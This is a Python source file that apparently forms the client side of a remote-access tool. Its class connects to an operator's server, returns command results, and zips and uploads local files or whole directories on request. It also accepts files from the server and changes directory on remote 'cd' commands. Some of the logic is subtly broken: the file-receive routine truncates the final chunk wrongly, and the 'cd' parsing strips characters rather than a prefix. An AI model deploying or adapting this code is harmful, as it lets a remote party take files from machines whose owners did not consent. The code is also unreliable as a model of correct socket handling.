import os.path
import socket
import zipfile



DELIMETER = "<END_OF_RESULTS>"
CHUNK_SIZE = 4*1024
class ClientConnection:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Connect(self, ip, port):
        self.socket.connect((ip, port))
        self.serverIP = ip
        self.serverPORT = port

    def ReceiveDAta(self):
        self.data_in_bytes = self.socket.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data


    def SendData(self, data):
        self.data_in_bytes = bytes(data, "utf-8")
        self.socket.send(self.data_in_bytes)


    def Close(self):
        self.socket.close()


    def SendCommandResult(self, command_result):
        dataSSend = command_result + DELIMETER
        dataBytes = dataSSend.encode()
        self.socket.sendall(dataBytes)


    def ReceiveFile(self, filename):
        print("[+] Receive file")

        with open(filename, "wb") as f:
            while True:
                chunk = self.socket.recv(CHUNK_SIZE)

                if chunk.endswith(DELIMETER.encode()):
                    chunk = chunk[:len(DELIMETER)]
                    f.write(chunk)
                    break
                f.write(chunk)
        print("[+] Completed")



    def SendFile(self, toDownload):
        print("[+] Sending file: ", toDownload)

        if os.path.isdir(toDownload):
            zippedName = toDownload + ".zip"
            zipf = zipfile.ZipFile(zippedName, "w", zipfile.ZIP_DEFLATED)

            for root, dirs, files in os.walk(toDownload):
                for file in files:
                    zipf.write(os.path.join(root, file))
            zipf.close()

        else:
            basename = os.path.basename(toDownload)
            name, ext = os.path.splitext(basename)
            toZip = name + ".zip"
            zipf = zipfile.ZipFile(toZip, "w")
            zipf.write(basename)
            zipf.close()
            zippedName = name + ".zip"

        zipContent = b''
        with open(zippedName, "rb") as f:
            zipContent = f.read()
            f.close()

        self.SendData(zippedName)
        zipWithDelimiter = zipContent + DELIMETER.encode()
        self.socket.send(zipWithDelimiter)
        os.remove(zippedName)


    def ChangeDir(self):
        print("[+] Changing directory")
        pwd = os.getcwd()
        self.SendData(pwd)
        while True:
            userCommand = self.ReceiveDAta()
            if userCommand == "stop":
                break
            if userCommand.startswith("cd"):
                path2move = userCommand.strip("cd ")
                if os.path.exists(path2move):
                    os.chdir(path2move)
                    pwd = os.getcwd()
                    self.SendData(pwd)
                else:
                    self.SendData(os.getcwd())
            else:
                self.SendData(os.getcwd())



